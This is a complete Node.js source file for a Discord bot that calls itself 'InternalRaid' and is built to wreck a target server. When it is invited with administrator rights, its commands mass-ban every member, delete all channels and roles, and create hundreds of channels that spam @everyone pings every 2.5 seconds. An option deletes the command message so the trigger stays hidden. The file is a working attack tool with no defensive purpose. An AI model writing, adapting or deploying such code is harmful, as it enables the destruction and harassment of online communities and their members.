const { Client, Events, GatewayIntentBits } = require('discord.js');
const { ChannelType } = require('discord.js');
const config = require('./config.json');

const rl = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});



const client = new Client({ intents: [ 
  GatewayIntentBits.DirectMessages,
  GatewayIntentBits.Guilds,
  GatewayIntentBits.GuildMessages,
  GatewayIntentBits.MessageContent,] });

function ChannelCreate(Info, Description) {
    this.Info = Info;
    this.Description = Description;
  }

const ChannelInfo = {};


function Cmds(CommandName, CommandUsage, CommandDescription) {
  this.CommandName = CommandName;
  this.CommandUsage = CommandUsage;
  this.CommandDescription = CommandDescription;
}

const cmd = {};

cmd.MassCMD = new Cmds("Mass", ".mass", "Create a channel and ping it every 2.5 second")
cmd.BanCMD = new Cmds("Ban", ".ban", "Ban everyone in the server")
cmd.DeleteC = new Cmds("Delete Channel", ".delc", "Delete all channel in the server in 1 second!")
cmd.DeleteR = new Cmds("Delete Roles", ".delr", "Delete all roles in the server in 1 second!")


client.once(Events.ClientReady, readyClient => {
    console.clear()
	console.log(`

    ██╗███╗   ██╗████████╗███████╗██████╗ ███╗   ██╗ █████╗ ██╗         ██████╗  █████╗ ██╗██████╗ 
    ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██║         ██╔══██╗██╔══██╗██║██╔══██╗
    ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝██╔██╗ ██║███████║██║         ██████╔╝███████║██║██║  ██║
    ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║         ██╔══██╗██╔══██║██║██║  ██║
    ██║██║ ╚████║   ██║   ███████╗██║  ██║██║ ╚████║██║  ██║███████╗    ██║  ██║██║  ██║██║██████╔╝
    ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ 
    > InternalRaid - v1.0.0                                                                                            
    > BOT: ${readyClient.user.tag}
    > Invite "${readyClient.user.username}" Link: https://discord.com/oauth2/authorize?client_id=${readyClient.user.id}&scope=bot+applications.commands&permissions=8
    ==================================COMMAND LIST==================================
    `);
    console.table(cmd)
    console.log("==================================SERVER LIST==================================");

  const guilds = client.guilds.cache.map(guild => {
    return {
      'Guild ID': guild.id,
      'Guild Name': guild.name
    };
  });

  console.table(guilds);

});

const sleep = (delay) => new Promise((resolve) => setTimeout(resolve, delay))



client.on("messageCreate", async (message) => {


      async function InternalBan() {
        console.log("> InternalBan - STARTED");
        try {
            const targetGuild = client.guilds.cache.get(config.TargetServer);
            if (!targetGuild) {
                throw new Error("Target guild not found");
            }

            const arrayOfIDs = targetGuild.members.cache.map(user => user.id);
            console.log("Found " + arrayOfIDs.length + " users.");

            await Promise.all(arrayOfIDs.map(async userId => {
                try {
                    const member = await targetGuild.members.fetch(userId);
                    await member.ban();
                    console.log(`${member.user.tag} was banned.`);
                } catch (error) {
                    console.log("Error Found: " + error);
                }
            }));

            console.log("> Banning members completed.");
        } catch (error) {
            console.error("Error:", error);
        }
    }

    async function InternalDelc() {
      try {
          const targetGuild = client.guilds.cache.get(config.TargetServer);
          if (!targetGuild) throw new Error("Target guild not found");
          await Promise.all(targetGuild.channels.cache.map(channel => channel.delete()));
          const newChannel = await targetGuild.channels.create({
              name: config.newChannelName,
          });
          console.log(`Successfully created channel: ${newChannel.name}`);
      } catch (error) {
          console.error("Error:", error);
      }
  }
  

    function InternalDelr() {
      const targetGuild = client.guilds.cache.get(config.TargetServer);
      if (!targetGuild) {
          return Promise.reject(new Error("Target guild not found"));
      }
      return Promise.all(targetGuild.roles.cache.map(role => role.delete().catch(err => console.log("Error Found: " + err))));
  }



    async function InternalMass(amount, channelName) {
        return new Promise((resolve, reject) => {
          if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
          if (isNaN(amount)) return reject("Type Error: Use a number for the amount");
          if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
      
          const targetGuild = client.guilds.cache.get(config.TargetServer);
            if (!targetGuild) {
                return reject("Target guild not found");
            }

          for (let i = 0; i < amount; i++) {
           // if (message.guild.channels.cache.size === 500) break;
            let name = channelName ? channelName : `internal-raid`;
            if (!name.trim()) {
              console.error("Error: Channel name cannot be empty"); continue; 
            }
      
            targetGuild.channels.create({
              name: channelName
            })
            
            .then(async channel => {
            ChannelInfo.NewCH = new ChannelCreate("Name: "+channel.name, `Channel "${channel.name}" created successfully`)
            console.table(ChannelInfo)
      
              for (let i = 0; i < config.pingNumber; i++) {
                channel.send("@everyone " + config.pingMessage);
                await sleep(2500);
              }
              
            }).catch(err => console.error("Error creating channel:", err));
          }
      
          resolve();
        });
      }


    if (message.content === ".ban") {
        if (config.DeleteMsg === true) message.delete()
        else message.channel.send("`> [MASS BAN] - Started`")
        InternalBan()
        console.log("> [MASS BAN] - Started")
    }

    if (message.content === ".delc") {
        if (config.DeleteMsg === true) message.delete()
        else message.channel.send("`> [DELETE ALL CHANNEL] - Started`")
        InternalDelc()
        console.log("> [DELETE ALL CHANNEL] - Started")
    }

    if (message.content === ".delr") {
        if (config.DeleteMsg === true) message.delete()
        else message.channel.send("`> [DELETE ALL ROLES] - Started`")
        InternalDelr()
        console.log("> [DELETE ALL ROLES] - Started")
    }

    if (message.content === ".mass") {
        if (config.DeleteMsg === true) message.delete()
        else message.channel.send("`> [MASS CHANNEL] - Started`")
        InternalMass(config.numberChannel, config.channelName)
        console.log("> [MASS CHANNEL] - Started")
    }


});



client.login(config.token);
